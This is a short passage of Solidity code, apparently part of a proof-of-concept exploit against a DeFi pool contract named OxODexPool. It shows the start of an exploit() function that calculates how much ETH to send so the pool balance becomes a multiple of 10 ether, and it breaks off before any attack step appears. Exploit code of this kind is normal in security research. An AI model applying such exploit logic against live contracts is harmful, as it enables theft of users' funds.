    function exploit() internal {
        // send ETH so pool balance is a multiple of 10
        uint256 poolETHBalance = address(OxODexPool).balance;
        poolETHBalance = 10 ether - (poolETHBalance - (poolETHBalance / 10 ether) * 10 ether);
